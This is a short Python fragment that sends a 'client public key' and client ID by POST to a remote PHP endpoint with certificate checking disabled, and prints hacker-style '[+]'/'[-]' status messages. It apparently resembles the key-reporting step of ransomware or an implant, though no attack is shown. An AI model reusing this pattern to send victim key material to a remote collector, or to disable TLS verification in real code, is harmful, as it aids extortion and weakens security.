from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import base64
import requests



# Send encrypted key to the server
def send_encrypted_key(client_public_key, client_id):
    payload = {
        "encrypted_key": f"{client_public_key}",
        "client_id": client_id
    }
    try:
        response = requests.post("http://owlguard.org/wg-recv.php", json=payload, verify=False)
        if response.status_code == 200:
            print("[+] Key sent successfully")
        else:
            print("[-] Error:", response.text)
    except Exception as e:
        print("[-] Failed to send:", str(e))
